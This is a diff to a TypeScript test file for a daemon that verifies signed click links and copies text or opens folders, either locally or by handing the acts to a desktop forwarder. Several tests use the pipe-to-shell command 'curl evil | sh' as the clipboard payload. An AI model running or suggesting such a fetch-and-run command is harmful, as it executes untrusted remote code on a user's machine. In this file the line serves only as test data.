@@ -4,8 +4,9 @@
 // A frame that asks for the click's acts to be carried out by its writer is
 // answered once the click has landed, with the acts it asked.
 
-import { handleRequest, type HandledRequest } from "../src/daemon/reply";
+import { handleRequest, type HandledRequest, type Reply } from "../src/daemon/reply";
 import type { DaemonParts } from "../src/daemon/daemon-parts";
+import { failureOf } from "../src/daemon/foundations/verb-error";
 import { rendererNameOf } from "../src/daemon/foundations/renderer-name";
 import { sessionIdOf } from "../src/daemon/foundations/session-id";
 import { RuntimeStats } from "../src/daemon/stats";
@@ -111,7 +112,7 @@ test("a forged copy link is refused at once, saying why, and the clipboard is un
       ok: false,
       code: "BAD_REQUEST",
     });
-    await answered.land();
+    await answered.told.land();
   }
   expect(h.copied).toEqual([]);
   expect(h.events).toHaveLength(2);
@@ -127,7 +128,7 @@ test("a signed link with an invalid session is refused in the forwarder verdict"
     ok: false,
     code: "BAD_REQUEST",
   });
-  await answered.land();
+  await answered.told.land();
   expect(h.events).toEqual([expect.stringContaining("outcome=bad-request")]);
   expect(h.events[0]).toContain("verb=undo");
   expect(h.events[0]).not.toContain("mailbox=");
@@ -144,7 +145,7 @@ test("the forwarder hears that the issuing renderer has no bundle before promisi
     ok: false,
     error: expect.stringContaining("renderer worktree"),
   });
-  await answered.land();
+  await answered.told.land();
   expect(h.copied).toEqual([]);
   expect(h.events).toEqual([expect.stringContaining("outcome=down")]);
   expect(h.events[0]).not.toContain("mailbox=");
@@ -157,15 +158,15 @@ test("a link the bar drew is told verified before its click lands, and then land
   expect(toldAtOnce(answered)).toEqual({ ok: true, output: "" });
   expect(h.copied).toEqual([]);
   release();
-  await answered.land();
+  await answered.told.land();
   expect(h.copied).toEqual(["curl evil | sh"]);
 });
 
 test("a version 1 frame's writer has hung up, so its verdict goes to no one", async () => {
   const h = host();
   const answered = await h.frame(TEST_SIGNER.signLink(COPY), 1);
-  expect(answered.told).toEqual({ when: "never" });
-  await answered.land();
+  expect(answered.told.when).toBe("never");
+  await answered.told.land();
   expect(h.copied).toEqual(["curl evil | sh"]);
 });
 
@@ -182,7 +183,7 @@ test("the verified forwarder acknowledgement still precedes a rate-limited effec
   const answered = await h.frame(TEST_SIGNER.signLink(COPY));
   expect(toldAtOnce(answered)).toEqual({ ok: true, output: "" });
   expect(h.unheard).toEqual([]);
-  await answered.land();
+  await answered.told.land();
   expect(h.events).toEqual([expect.stringContaining("outcome=threw")]);
   expect(h.unheard).toEqual([
     expect.stringContaining("rate-limited: click.pbcopy"),
@@ -201,7 +202,7 @@ test("a click whose act failed is answered as failed, and the failure is the dae
     signal: null,
   });
   const answered = await h.frame(TEST_SIGNER.signLink(COPY));
-  await answered.land();
+  await answered.told.land();
   expect(h.events).toEqual([expect.stringContaining("outcome=threw")]);
   expect(h.unheard).toEqual([expect.stringMatching(/^copy: pbcopy failed/)]);
 });
@@ -214,18 +215,28 @@ describe("a frame that asks for its acts on the desktop", () => {
   const OPEN = effectsUrl([{ verb: VERB_OPEN_VSCODE, args: ["/work/repo"] }]);
   const desktopFrame = (h: ReturnType<typeof host>, url: string) =>
     h.frame(url, URL_FRAME_VERSION, ACTS_ON_DESKTOP);
+  // The verdict a writer that waits on the landing is sent.
+  const landed = async (
+    answered: Extract<HandledRequest, { kind: "url" }>,
+  ): Promise<Reply> => {
+    if (answered.told.when !== "landed")
+      throw new Error(`told ${answered.told.when}`);
+    return answered.told.land();
+  };
 
   test("is told once the click landed, with the copy it asked, and copies nothing here", async () => {
     const h = host();
     const answered = await desktopFrame(h, TEST_SIGNER.signLink(COPY));
-    expect(answered.told).toEqual({ when: "landed" });
-    expect((await answered.land()).resp).toEqual({
+    expect(answered.told.when).toBe("landed");
+    expect((await landed(answered)).resp).toEqual({
       ok: true,
       output: "",
       desktopActs: [{ kind: "copy", text: "curl evil | sh" }],
     });
     expect(h.copied).toEqual([]);
+    // Counted on the click's event; the act's own line is the renderer host's.
     expect(h.events).toEqual([expect.stringContaining("outcome=ok")]);
+    expect(h.events[0]).toContain("via=desktop-forwarder");
     expect(h.events[0]).toContain("desktop=1");
     expect(h.unheard).toEqual([]);
   });
@@ -233,7 +244,7 @@ describe("a frame that asks for its acts on the desktop", () => {
   test("is handed an open and launches nothing here", async () => {
     const h = host();
     const answered = await desktopFrame(h, TEST_SIGNER.signLink(OPEN));
-    expect((await answered.land()).resp).toEqual({
+    expect((await landed(answered)).resp).toEqual({
       ok: true,
       output: "",
       desktopActs: [{ kind: "open", target: "/work/repo" }],
@@ -248,7 +259,7 @@ describe("a frame that asks for its acts on the desktop", () => {
       ok: false,
       code: "BAD_REQUEST",
     });
-    await answered.land();
+    await answered.told.land();
     expect(h.copied).toEqual([]);
   });
 
@@ -263,7 +274,7 @@ describe("a frame that asks for its acts on the desktop", () => {
       ok: false,
       error: expect.stringContaining("mars"),
     });
-    await answered.land();
+    await answered.told.land();
     expect(h.copied).toEqual([]);
   });
 
@@ -274,8 +285,8 @@ describe("a frame that asks for its acts on the desktop", () => {
       1,
       ACTS_ON_DESKTOP,
     );
-    expect(answered.told).toEqual({ when: "never" });
-    await answered.land();
+    expect(answered.told.when).toBe("never");
+    await answered.told.land();
     expect(h.copied).toEqual([]);
     expect(h.events).toEqual([expect.stringContaining("outcome=bad-request")]);
   });
@@ -286,51 +297,55 @@ describe("a frame that asks for its acts on the desktop", () => {
       TEST_SIGNER.signLink(effectsUrl([{ verb: VERB_COPY, args: [text] }])),
     );
     const both = await Promise.all(urls.map((url) => desktopFrame(h, url)));
-    const verdicts = await Promise.all(both.map((answered) => answered.land()));
+    const verdicts = await Promise.all(both.map(landed));
     expect(verdicts.map(({ resp }) => resp)).toEqual([
       { ok: true, output: "", desktopActs: [{ kind: "copy", text: "first" }] },
       { ok: true, output: "", desktopActs: [{ kind: "copy", text: "second" }] },
     ]);
   });
 
-  test("a click whose turn throws after asking a copy still hands the copy back", async () => {
+  test("a click that fails after asking a copy still hands the copy back, in the failure", async () => {
     const h = host(undefined, undefined, (renderer) => ({
       ...renderer,
-      answerClick: async (_session, make) => {
-        const made = make();
-        if (made.kind !== "event" || made.leaveToDesktop === undefined)
-          throw new Error("the click was not made to leave its acts");
-        made.leaveToDesktop({ kind: "copy", text: "asked before the throw" });
-        throw new Error("the turn failed after asking");
-      },
+      answerClick: async () => ({
+        kind: "threw",
+        failure: failureOf(new Error("the turn failed after asking")),
+        record: [],
+        effects: [],
+        settlePresentation: () => {},
+        queuedMs: 0,
+        turnMs: null,
+        hopMs: null,
+        settled: [
+          { kind: "left", act: { kind: "copy", text: "asked before failing" } },
+        ],
+      }),
     }));
     const answered = await desktopFrame(h, TEST_SIGNER.signLink(COPY));
-    expect((await answered.land()).resp).toMatchObject({
+    expect((await landed(answered)).resp).toMatchObject({
       ok: false,
       code: "RENDER_FAILED",
-      desktopActs: [{ kind: "copy", text: "asked before the throw" }],
+      desktopActs: [{ kind: "copy", text: "asked before failing" }],
     });
   });
 
   test("a verdict its writer never took says the acts it carried went with it", async () => {
     const h = host();
     const answered = await desktopFrame(h, TEST_SIGNER.signLink(COPY));
-    (await answered.land()).settled(false);
+    (await landed(answered)).settled(false);
     expect(h.events).toEqual([
       expect.stringContaining("outcome=ok"),
       expect.stringContaining("1 copy or open act(s)"),
     ]);
+    expect(h.events[1]).toContain("left before the verdict");
   });
 
   test("a frame that does not ask is told at once, and its click copies on this machine", async () => {
     const h = host();
     const answered = await h.frame(TEST_SIGNER.signLink(COPY));
     expect(toldAtOnce(answered)).toEqual({ ok: true, output: "" });
-    // Nothing was left to the writer, whatever it is told of it.
-    expect((await answered.land()).resp).toMatchObject({
-      ok: true,
-      desktopActs: [],
-    });
+    await answered.told.land();
     expect(h.copied).toEqual(["curl evil | sh"]);
+    expect(h.events.at(-1)).toContain("via=forwarder");
   });
 });
